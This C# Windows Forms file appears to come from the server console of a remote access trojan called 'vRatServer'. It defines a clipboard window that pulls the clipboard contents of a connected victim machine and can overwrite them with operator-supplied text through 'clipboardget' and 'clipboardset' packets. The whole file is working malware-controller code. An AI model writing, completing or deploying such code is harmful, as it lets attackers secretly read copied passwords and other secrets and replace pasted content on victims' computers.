using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class Clipboard : Form
    {
        Client cli;
        byte[] r = null;
        public Clipboard(Client cli)
        {
            
            this.cli = cli;
            InitializeComponent();
        }

        public void clipboardData(string text)
        {
            this.textBox1.Text = text;
        }
        private void Clipboard_Load(object sender, EventArgs e)
        {
            cli.clpd = this;
            this.Text = this.Text + " - " + cli.Name;
            globals.SendPacket(cli, (byte)globals.PacketType.clipboardget, 0, 0, ref r);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            globals.SendPacket(cli, (byte)globals.PacketType.clipboardget, 0, 0, ref r);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string newclip = this.textBox2.Text;
            byte[] newclipbytes = Encoding.Unicode.GetBytes(newclip);
            byte[] concatenatedArray = newclipbytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
            globals.SendPacket(cli, (byte)globals.PacketType.clipboardset, concatenatedArray.Length, 0, ref concatenatedArray);
        }

        private void Clipboard_FormClosed(object sender, FormClosedEventArgs e)
        {
            cli.clpd = null;
        }
    }
}
